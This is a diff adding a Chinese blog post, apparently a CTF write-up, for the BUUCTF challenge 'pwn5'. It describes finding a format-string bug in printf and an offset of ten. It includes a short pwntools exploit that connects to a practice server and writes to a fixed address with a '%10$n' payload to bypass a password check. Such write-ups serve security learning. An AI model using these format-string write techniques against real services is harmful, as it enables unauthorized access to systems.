@@ -153,6 +153,81 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-第三周pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/">第三周pwn</a>
+    </h1>
+  
+
+        
+        <a href="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/" class="archive-article-date">
+  	<time datetime="2023-02-02T13:32:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2023-02-02</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="1-第五空间-pwn5"><a href="#1-第五空间-pwn5" class="headerlink" title="1.第五空间 pwn5"></a>1.第五空间 pwn5</h2><img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-02_21-33-48.png" style="zoom:50%;">
+
+<p>发现打开了Canary和NX，就是说用不了栈溢出了</p>
+<p>打开ida反编译，在main函数中看到printf(&amp;buf);<img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-02_21-35-57.png"></p>
+<p>考查格式化字符串漏洞，再观察函数，<img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-02_21-35-49.png"></p>
+<p>大意是将随机数与密码比较，如果相等，则拿到权限。</p>
+<p>随机数的地址已知，再找偏移量，name有回显，可以根据这一点寻找。</p>
+<p><img src="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/Snipaste_2023-02-02_21-40-50.png"></p>
+<p>得到偏移量为十</p>
+<p>最后进行覆盖</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">26754</span>)</span><br><span class="line">addr=<span class="number">0x804C044</span></span><br><span class="line">payload=p32(addr)+<span class="string">b&quot;%10$n&quot;</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.sendline(<span class="string">b&quot;4&quot;</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>其中<code>%10$n</code>是让地址偏移十，<code>%11$n</code>同理。</p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2023/02/02/%E7%AC%AC%E4%B8%89%E5%91%A8pwn/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-第二周pwn" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
